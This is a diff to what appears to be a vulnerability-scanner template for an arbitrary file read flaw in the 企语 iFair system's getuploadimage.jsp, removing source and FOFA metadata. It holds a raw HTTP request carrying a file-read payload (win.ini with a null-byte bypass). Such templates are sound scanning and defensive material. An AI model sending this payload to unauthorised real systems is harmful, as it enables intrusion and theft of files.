@@ -3,12 +3,8 @@ info:
   name: 企语iFair协同管理系统getuploadimage.jsp任意文件读取漏洞_fouv0n6cmc346r9k
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: file-upload,lfi,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: app:"企语 iFair"
 http:
 - raw:
   - 'GET /oa/common/components/upload/getuploadimage.jsp?imageURL=C:\Windows\win.ini%00.jpg HTTP/1.1
